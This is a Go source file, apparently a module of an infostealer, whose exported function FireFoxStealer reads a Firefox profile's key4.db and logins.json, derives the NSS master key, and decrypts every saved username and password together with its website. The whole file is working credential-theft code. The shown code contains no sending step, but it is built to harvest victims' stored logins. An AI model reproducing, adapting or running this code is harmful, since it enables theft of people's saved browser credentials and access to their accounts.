package core

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/sha1"
	"crypto/sha256"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"

	"golang.org/x/crypto/pbkdf2"
	_ "modernc.org/sqlite"
)

type MetaASN struct {
	MetaASN1
	Encrypted []byte
}

type MetaASN1 struct {
	PKCS5PBES2 asn1.ObjectIdentifier
	MetaASN2
}
type MetaASN2 struct {
	MetaASN3
	MetaASN4
}

type MetaASN3 struct {
	PKCS5PBKDF2 asn1.ObjectIdentifier
	MetaASN5
}

type MetaASN4 struct {
	AES256CBC asn1.ObjectIdentifier
	IV        []byte
}

type MetaASN5 struct {
	EntrySalt      []byte
	IterationCount int
	KeySize        int
	MetaASN6
}

type MetaASN6 struct {
	HMACWithSHA256 asn1.ObjectIdentifier
}

type LoginASN struct {
	CipherText []byte
	LoginASN1
	Encrypted []byte
}

type LoginASN1 struct {
	asn1.ObjectIdentifier
	IV []byte
}

type LoginsJSON struct {
	Logins []Logins
}

type Logins struct {
	Hostname    string `json:"hostname"`
	EncUsername string `json:"encryptedUsername"`
	EncPassword string `json:"encryptedPassword"`
}

type FireFoxPasswords struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Website  string `json:"website"`
}

func decryptMeta(password []byte, salt []byte, metaData MetaASN) []byte {
	saltSHA := sha1.Sum(salt)
	key := pbkdf2.Key(saltSHA[:], metaData.EntrySalt, metaData.IterationCount, metaData.KeySize, sha256.New)
	IV := append([]byte{4, 14}, metaData.IV...)

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	encryptedLength := len(metaData.Encrypted)
	if encryptedLength < block.BlockSize() {
		return nil
	}

	output := make([]byte, encryptedLength)
	mode := cipher.NewCBCDecrypter(block, IV)
	mode.CryptBlocks(output, metaData.Encrypted)
	output = pkcs5UnPadding(output)
	return output
}

func decryptLogin(key []byte, loginData LoginASN) []byte {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, loginData.IV)
	decrypted := make([]byte, len(loginData.Encrypted))
	blockMode.CryptBlocks(decrypted, loginData.Encrypted)
	return decrypted
}

func pkcs5UnPadding(src []byte) []byte {
	length := len(src)
	unpad := int(src[length-1])
	return src[:(length - unpad)]
}

func fireFoxGetKeys(UserFolder string) ([]byte, []byte) {
	fireFoxKeyFile := UserFolder + "\\key4.db"
	passwordDB, err := sql.Open("sqlite", fireFoxKeyFile)
	if err != nil {
		return nil, nil
	}
	results, err := passwordDB.Query("SELECT item1 FROM metaData WHERE id = 'password'")
	if err != nil {
		return nil, nil
	}
	var item1 []byte
	for results.Next() {
		results.Scan(&item1)
	}
	defer results.Close()
	nssResults, err := passwordDB.Query("SELECT a11 FROM nssPrivate")
	if err != nil {
		return nil, nil
	}
	var nss11 []byte
	for nssResults.Next() {
		nssResults.Scan(&nss11)
	}
	defer passwordDB.Close()

	return item1, nss11
}

func FireFoxStealer(UserFolder string) []FireFoxPasswords {
	salt, nss11 := fireFoxGetKeys(UserFolder)
	var PasswordJSON []FireFoxPasswords
	var asn MetaASN
	var user, pass LoginASN
	var masterPwd []byte
	_, err := asn1.Unmarshal(nss11, &asn)
	if err != nil {
		return nil
	}
	masterKey := decryptMeta(masterPwd, salt, asn)
	masterKey = masterKey[:24]
	loginsBody, _ := ioutil.ReadFile(UserFolder + "\\logins.json")
	var FireFoxLogins LoginsJSON

	json.Unmarshal(loginsBody, &FireFoxLogins)
	for i := range FireFoxLogins.Logins {
		encUsername, _ := base64.StdEncoding.DecodeString(FireFoxLogins.Logins[i].EncUsername)
		_, err = asn1.Unmarshal(encUsername, &user)
		if err != nil {
			return nil
		}
		encPassword, _ := base64.StdEncoding.DecodeString(FireFoxLogins.Logins[i].EncPassword)
		_, err = asn1.Unmarshal(encPassword, &pass)
		if err != nil {
			return nil
		}
		decUsername := decryptLogin(masterKey, user)
		decPassword := decryptLogin(masterKey, pass)
		PasswordJSON = append(PasswordJSON, FireFoxPasswords{
			Username: string(pkcs5UnPadding(decUsername)),
			Password: string(pkcs5UnPadding(decPassword)),
			Website:  FireFoxLogins.Logins[i].Hostname,
		})
	}
	return PasswordJSON
}
